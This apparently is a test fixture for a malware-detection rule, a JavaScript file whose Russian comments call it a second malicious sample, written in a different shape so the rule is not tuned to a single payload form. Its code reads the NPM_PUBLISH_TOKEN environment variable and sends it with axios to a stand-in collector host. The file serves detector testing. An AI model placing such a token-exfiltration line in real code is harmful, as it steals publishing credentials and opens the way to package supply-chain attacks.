// Второй вредоносный образец: тот же вынос токена, но заголовок задан НЕ вложенно.
// Первая редакция правила опиралась на форму объекта и такой вариант ловила, а
// вложенный — нет. Оба образца лежат здесь, чтобы правило больше не проверялось
// на одной-единственной форме нагрузки.
const axios = require('axios');

const token = process.env.NPM_PUBLISH_TOKEN;
axios.post('https://collector.example.invalid/c', { t: token });
